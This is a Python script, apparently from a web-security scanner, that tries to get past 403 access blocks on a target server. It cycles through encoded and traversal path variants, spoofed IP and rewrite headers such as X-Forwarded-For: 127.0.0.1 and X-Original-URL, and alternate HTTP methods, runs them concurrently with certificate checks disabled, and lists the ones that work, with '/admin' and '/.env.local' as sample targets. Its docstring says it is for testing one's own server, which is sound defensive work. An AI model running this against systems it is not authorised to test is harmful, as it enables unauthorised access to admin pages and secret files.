"""
403 Bypass Tester
Tests common techniques used to verify if a 403 block on YOUR OWN server
is properly hardened or can be bypassed by path/header tricks.
"""
import requests
import concurrent.futures
import urllib3
urllib3.disable_warnings()

HEADERS = "Mozilla/5.0 (Security Tester)"

# ── Path manipulation techniques ──────────────────────────────────────────────
def path_variants(path):
    p = path.lstrip("/")
    return [
        # Case & encoding
        f"/{p.upper()}",
        f"/{p.lower()}",
        f"/{p}%20",
        f"/{p}%09",
        f"/{p}%00",
        f"/{p}.json",
        f"/{p}.html",
        f"/{p}~",
        f"/{p}.bak",
        # Path traversal tricks
        f"//{p}",
        f"/{p}/.",
        f"/{p}//",
        f"/./{p}",
        f"/;/{p}",
        f"/{p};/",
        f"/%2f{p}",
        f"/{p}%2f",
        f"/{p}..;/",
        f"/..;/{p}",
        # URL encoded slashes
        f"/{p.replace('/','%2f')}",
        f"/{p.replace('/','%252f')}",
        # Double encoding
        f"/{p.replace('a','%61').replace('e','%65')}",
    ]

# ── Header spoofing techniques ────────────────────────────────────────────────
SPOOF_HEADERS = [
    {"X-Original-URL":          "/{path}"},
    {"X-Rewrite-URL":           "/{path}"},
    {"X-Custom-IP-Authorization":"127.0.0.1"},
    {"X-Forwarded-For":         "127.0.0.1"},
    {"X-Forwarded-For":         "localhost"},
    {"X-Forwarded-Host":        "localhost"},
    {"X-Host":                  "localhost"},
    {"X-Remote-IP":             "127.0.0.1"},
    {"X-Remote-Addr":           "127.0.0.1"},
    {"X-ProxyUser-Ip":          "127.0.0.1"},
    {"X-Real-IP":               "127.0.0.1"},
    {"X-Client-IP":             "127.0.0.1"},
    {"X-originating-IP":        "127.0.0.1"},
    {"X-Forwarded-For":         "0.0.0.0"},
    {"Client-IP":               "127.0.0.1"},
    {"True-Client-IP":          "127.0.0.1"},
    {"Cluster-Client-IP":       "127.0.0.1"},
    {"X-ProxyUser-Ip":          "127.0.0.1"},
    {"Referer":                 "https://localhost/admin"},
    {"X-WAF-Bypass":            "true"},
]

# ── HTTP method tricks ────────────────────────────────────────────────────────
ALT_METHODS = ["POST", "PUT", "PATCH", "DELETE", "HEAD",
               "OPTIONS", "TRACE", "CONNECT", "INVENTED"]

def _get(url, extra_headers=None, method="GET", timeout=5):
    h = {"User-Agent": HEADERS}
    if extra_headers:
        h.update(extra_headers)
    try:
        r = requests.request(method, url, headers=h, timeout=timeout,
                             verify=False, allow_redirects=False)
        return r.status_code, len(r.content), r.headers.get("Content-Type","")
    except Exception:
        return None, 0, ""

def bypass_403(base_url, path, timeout=5):
    """
    Given a base URL and a 403 path, try every bypass technique.
    Returns list of successful bypasses (status != 403/404).
    """
    base = base_url.rstrip("/")
    path = "/" + path.lstrip("/")
    full = base + path
    bypasses = []

    # 1. Path variants
    for variant in path_variants(path):
        url = base + variant
        code, size, ct = _get(url, timeout=timeout)
        if code and code not in (403, 404, 400, 410):
            bypasses.append({
                "technique": "path_manipulation",
                "description": f"Path variant: {variant}",
                "url": url,
                "status": code,
                "size": size,
                "severity": "critical" if code == 200 else "high",
            })

    # 2. Header spoofing
    for hdr in SPOOF_HEADERS:
        # Substitute {path} placeholder if present
        filled = {k: v.replace("{path}", path) for k, v in hdr.items()}
        code, size, ct = _get(full, extra_headers=filled, timeout=timeout)
        if code and code not in (403, 404, 400, 410):
            hdr_str = ", ".join(f"{k}: {v}" for k, v in filled.items())
            bypasses.append({
                "technique": "header_spoof",
                "description": f"Header: {hdr_str}",
                "url": full,
                "status": code,
                "size": size,
                "severity": "critical" if code == 200 else "high",
            })

    # 3. HTTP method switch
    for method in ALT_METHODS:
        code, size, ct = _get(full, method=method, timeout=timeout)
        if code and code not in (403, 404, 400, 405, 410):
            bypasses.append({
                "technique": "method_switch",
                "description": f"Method: {method}",
                "url": full,
                "status": code,
                "size": size,
                "severity": "critical" if code == 200 else "high",
            })

    # Deduplicate by (technique, status, size)
    seen = set()
    unique = []
    for b in bypasses:
        key = (b["technique"], b["status"], b["size"])
        if key not in seen:
            seen.add(key)
            unique.append(b)

    return unique


def run_bypass_scan(base_url, paths_403, max_workers=15, timeout=5):
    """
    Run bypass tests on a list of 403 paths concurrently.
    paths_403: list of path strings e.g. ["/admin", "/.env.local"]
    """
    all_results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = {ex.submit(bypass_403, base_url, p, timeout): p for p in paths_403}
        for f in concurrent.futures.as_completed(futs):
            path = futs[f]
            try:
                result = f.result()
                all_results[path] = result
            except Exception as e:
                all_results[path] = [{"technique": "error", "description": str(e),
                                       "status": None, "severity": "info"}]
    return all_results
